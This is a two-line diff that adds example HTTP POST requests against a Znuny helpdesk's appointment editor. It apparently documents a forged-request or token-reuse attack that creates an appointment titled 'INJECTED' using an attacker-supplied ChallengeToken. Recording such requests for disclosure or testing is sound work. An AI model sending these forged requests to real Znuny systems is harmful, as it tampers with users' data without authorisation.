@@ -1,0 +1,2 @@
+POST /znuny/index.pl (EditMask)  Action=AgentAppointmentEdit;Subaction=EditMask;AppointmentID=7;ChallengeToken=<attacker>
+POST /znuny/index.pl (create)   Action=AgentAppointmentEdit;Subaction=EditAppointment;CalendarID=8;Title=INJECTED;StartTime=...;ChallengeToken=<attacker>
